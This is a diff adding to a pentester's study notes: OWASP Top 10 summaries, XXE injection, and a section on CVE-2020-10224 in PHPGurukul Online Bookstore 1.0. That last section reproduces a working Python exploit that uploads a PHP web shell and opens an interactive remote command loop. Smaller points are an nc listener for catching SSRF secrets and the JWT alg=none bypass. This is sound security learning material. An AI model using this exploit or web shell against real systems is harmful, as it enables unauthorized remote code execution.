@@ -1,6 +1,121 @@
 # Penetration Testing Tips
 
 
+## OWASP Top 10
+
+OWASP (Open Worldwide Application Security Project) is a non-profit organization dedicated to improve software security.  
+They provide tools, resources and standards to help developers secure applications against vulnerabilities. 
+
+OWASP maintains the OWASP Top 10 list of the critical security risks in web applications.  
+The list is updated regularly to reflect emerging threats (latest updated in 2021).  
+
+### 1 - Broken Access Control
+
+Broken Access Control occurs when users can bypass authorization and access resources they should not be allowed to.  
+- Insecure Direct Object Reference (IDOR) when the page of an object is accessible by parameter without proper permission validation
+- admin endpoint which permissions is not checked
+
+### 2 - Cryptographic Failures
+
+Cryptographic failures is the misuse or absence of cryptographic algorithm to protect sensitive data.  
+It can be a failure to protect data in transit or at rest.  
+- outdated encryption algorithm
+- hardcoded encryption keys
+- storage of clear password in database instead of a hash
+- file of a flat-file database (like sqlite3) unprotected, allowing download and use locally with full privilege 
+
+### 3 - Injections
+
+Injections occur when untrusted user input is interpreted as commands or parameters by the backend.  
+It happens when the backend does not implement proper input validation (sanitization, parametrized queries...).  
+- SQL injection : the attacker manipulates SQL queries, gaining potential control over the DB
+- Command injection : the attacker executes system commands, allowing potential RCE
+
+### 4 - Insecure Design
+
+Insecure design are vulnerabilities inherent to the application's architecture.  
+It results from a lack of secure design principles during the development phase.
+- app without session expiry for sensitive actions
+- missing OTP validation
+- insecure password reset
+
+### 5 - Security Misconfiguration
+
+Security misconfiguration occurs when the system could have been secure with the right configuration, but was vulnerable due to poor configuration.  
+It happens often with cloud infrastructure, when the configuration is not properly understood.
+- incorrect permissions for S3 bucket
+- Unnecessary services running on a machine
+- default account with unchanged passwords
+- error messages revealing internal info
+- debugging interface still enabled in prod
+
+### 6 - Vulnerable and Outdated Components
+
+Some systems still use outdated components with known vulnerabilities, sometimes with exploits available on ExploitDB.  
+For example, WordPress 4.6 has a known unauthenticated RCE vulnerability with available exploits.
+
+### 7 - Identification and Authentication Failures
+
+Identification and authentication failures occur when the authentication mechanism is flawed.  
+Usually it uses a username/password verified by the server, and returns a session cookie.  
+
+Typical flaws include :
+- brute-force attacks if no lockout mechanism and no delay between attempts
+- weak passwords if no strong password policy enforced
+- weak session cookies if they are predictable and can be guessed by the attacker
+
+### 8 - Software and Data Integrity Failures
+
+Software and data integrity failures occur when an attacker manages to modify the software code or data.  
+A common example is to get the victim to download a malicious installer or application patch.
+
+Most application vendors publish various hashes for the files they offer in download.  
+The integrity of the downloaded files should be checked by comparing the hash to the vendor-provided hash :
+```shell
+md5sum <FILE>
+sha1sum <FILE>
+sha256sum <FILE>
+```
+
+Javascript libraries can be included in the frontend code directly by a URL to the vendor's server :
+```html
+<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+```
+
+To prevent the users of our website to load malicious JS code, we can specify a hash along with the URL.  
+This mechanism is called **Sub-Resource Integrity (SRI)**.  
+The hash of a file at a given URL can be generated from `https://www.srihash.org`.  
+```html
+<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-<HASH>"></script>
+```
+
+An example of data integrity failure is the invalid decryption of JWT tokens by some JWT libraries.  
+A JWT contains 3 base64 parts : a header with the encryption algorithm, a payload and a signature encrypted with a secret key.  
+If we alter the payload, we have no way to generate the correct signature without the server secret key.  
+Some JWT libraries could be tricked by changing the `alg` value to `none` in the header, and modifying the payload.  
+With this change, the libraries did not verify the signature, and accepted any payload as valid.
+
+### 9 - Security Logging and Monitoring Failures
+
+Every user action should be logged, so an attacker's activities can be traced when an incident happens.  
+This is required to determine the risk and the impact of the attack.  
+For each request, a web server should at least log the HTTP status, the timestamp, the username, the API endpoint and the IP address.  
+These logs should be monitored to detect attacks and stop it or reduce their impact.
+
+### 10 - Server-Side Request Forgery 
+
+SSRF vulnerabilities occur when an attacker can coerce a web application to send specific requests to arbitrary destinations.  
+This gives the attacker the permissions and trust of the victim web application.  
+
+A common example of SSRF vulnerability is when a website uses a 3rd party service, and exposes it in a URL that the user can modify.  
+If a web application includes the 3rd party server or IP in its request, the attacker can modify it to his own server.  
+This way, the web application would send a request to the attacker server, exposing its secret API key for this 3rd party service.  
+The attacker can simply listen to the incoming request to capture its content, for example with `nc -lvp 80`
+
+SSRF vulnerabilities can allow the attacker to enumerate the internal network, abuse the trust relationship between servers,
+and possibly get RCE on other machines in the internal network.
+
+
 ## XSS Attacks
 
 ### Payload
@@ -55,7 +170,7 @@ This happens for example if we create a support request which body is not saniti
 to create a ticket in a ticketing system (JIRA, FreshDesk...).  
 In that case, the payload should report to an HTTP API when executed, to transmit the stolen info.
 
-**XSS Hunter Express** can be used to perform Blind XSS attacks, it will capture cookies, URK, page content...
+**XSS Hunter Express** can be used to perform Blind XSS attacks, it will capture cookies, URL, page content...
 
 
 ## Directory Traversal
@@ -81,6 +196,39 @@ When the web server can only return local files, it is a LFI.
 If the web server queries the URL of the input file, it is a RFI.  
 In case of a RFI, we can force the web server to execute a malicious PHP file from a server owned by the attacker.  
 This results in a RCE vulnerability.
+
+
+## XXE Injection (XML External Entity Injection)
+
+An XXE injection is an attack targeting websites taking advantage of the external entities feature of the XML language.  
+
+XML supports external entities (XXE), which allow the content of an external file (local or remote) to be included inside an XML document.  
+An entity called `ext` can be defined in the XML definition path with its location, and is referenced with `&ext;` in the XML body.
+
+For example, a legitimate use of XXE could include an address from a file inside the XML object :
+```xml
+<!DOCTYPE people [
+   <!ENTITY ext SYSTEM "http://example.com/address.txt">
+]>
+<people>
+   <name>John</name>
+   <address>&ext;</address>
+   <email>john@example.com</email>
+   <phone>080-1234-5678</phone>
+</people>
+```
+
+An XXE injection consists in abusing this mechanism to reveal files on the machine that parses the XML object.  
+For example, we could specify an XXE location of `/etc/passwd` so the content of that file is saved inside the XML object.  
+
+XXE injection can be used even when we do not have control over the entire XML, for example when a user value gets embedded in an XML document.  
+In that case, we cannot define an external entity, but we can use `XInclude` instead.
+
+XXE is a dangerous feature that is usually not required in web applications.  
+To protect against this attack, most XML parsers have the option to disable XXE, for example with `libxml_disable_entity_loader(true)` in PHP.  
+
+XXE injections are often used to expose the content of a file on the target machine.  
+They can also be used for SSRF (Server-Side Request Forgery) to force the target machine to send a specific request to another machine.
 
 
 ## Run a local webserver
@@ -148,3 +296,53 @@ On Linux, it does not seem to overwrite anything crucial, but on Windows it over
 
 This vulnerability can be exploited in Metasploit with the `exploit/windows/http/icecast_header` exploit.  
 This can offer a Meterpreter terminal with the user running IceCast (we need another attack to escalate privilege if needed).
+
+
+### Unauthenticated file upload in PHPGurukul Online Bookstore 1.0 (CVE-2020-10224 - score 9.8)
+
+This is not a very impactful CVE because its target is very specific, but it is a good example of a web-shell injection.  
+
+The PHPGurukul Online Bookstore exposes a PHP page called `admin_add.php` for uploading an image.  
+It can be used unauthenticated, and does not check the type of the uploaded file.  
+This means we can upload a PHP file that executes commands on the web server as of the web server user.  
+
+A public example of exploit is a Python script that uploads such a PHP web-shell, then uses it to offer a remote shell :
+```python
+import argparse
+import random
+import requests
+import string
+import sys
+
+parser = argparse.ArgumentParser()
+parser.add_argument('url', action='store', help='The URL of the target.')
+args = parser.parse_args()
+
+url = args.url.rstrip('/')
+random_file = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))
+
+payload = '<?php echo shell_exec($_GET[\'cmd\']); ?>'
+
+file = {'image': (random_file + '.php', payload, 'text/php')}
+print('> Attempting to upload PHP web shell...')
+r = requests.post(url + '/admin_add.php', files=file, data={'add':'1'}, verify=False)
+print('> Verifying shell upload...')
+r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':'echo ' + random_file}, verify=False)
+
+if random_file in r.text:
+    print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php')
+    print('> Example command usage: ' + url + '/bootstrap/img/' + random_file + '.php?cmd=whoami')
+    launch_shell = str(input('> Do you wish to launch a shell here? (y/n): '))
+    if launch_shell.lower() == 'y':
+        while True:
+            cmd = str(input('RCE $ '))
+            if cmd == 'exit':
+                sys.exit(0)
+            r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':cmd}, verify=False)
+            print(r.text)
+else:
+    if r.status_code == 200:
+        print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php, however a simple command check failed to execute. Perhaps shell_exec is disabled? Try changing the payload.')
+    else:
+        print('> Web shell failed to upload! The web server may not have write permissions.')
+```
